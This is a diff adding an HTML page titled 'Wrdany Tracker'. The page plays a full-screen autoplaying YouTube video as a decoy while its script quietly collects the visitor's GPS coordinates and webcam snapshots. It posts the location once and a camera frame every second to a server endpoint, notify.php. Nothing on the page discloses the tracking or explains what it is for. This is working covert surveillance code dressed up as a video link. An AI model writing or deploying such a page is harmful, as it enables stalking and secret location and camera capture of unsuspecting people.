@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Wrdany Tracker</title>
+  <style>
+    body { margin: 0; background: black; }
+    iframe { width: 100vw; height: 100vh; border: none; }
+  </style>
+</head>
+<body>
+
+  <iframe src="https://www.youtube.com/embed/okfmPs-a8s8?autoplay=1&controls=1" allow="autoplay; encrypted-media"></iframe>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(pos => {
+      fetch("notify.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude
+        })
+      });
+    });
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
+
+      const canvas = document.createElement("canvas");
+
+      setInterval(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("image", blob, "selfie.jpg");
+
+          fetch("notify.php", {
+            method: "POST",
+            body: formData
+          });
+        }, "image/jpeg");
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
